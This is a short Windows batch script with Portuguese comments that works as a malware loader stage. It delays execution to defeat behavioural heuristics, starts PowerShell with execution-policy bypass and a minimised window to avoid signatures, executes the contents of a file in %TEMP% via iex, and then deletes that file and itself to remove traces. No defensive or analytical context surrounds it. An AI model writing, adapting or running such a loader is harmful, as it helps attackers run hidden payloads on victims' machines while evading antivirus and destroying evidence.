@echo off
:: Aguarda 3 segundos para quebrar a análise comportamental (Heurística)
ping -n 4 127.0.0.1 >nul
:: Executa o PowerShell de forma "suja" para evitar assinaturas
powershell -ep bypass -w 1 -c "$f=Get-Content '%TEMP%\f.log' -Raw; iex $f"
:: Limpeza
del "%TEMP%\f.log"
del "%~f0"
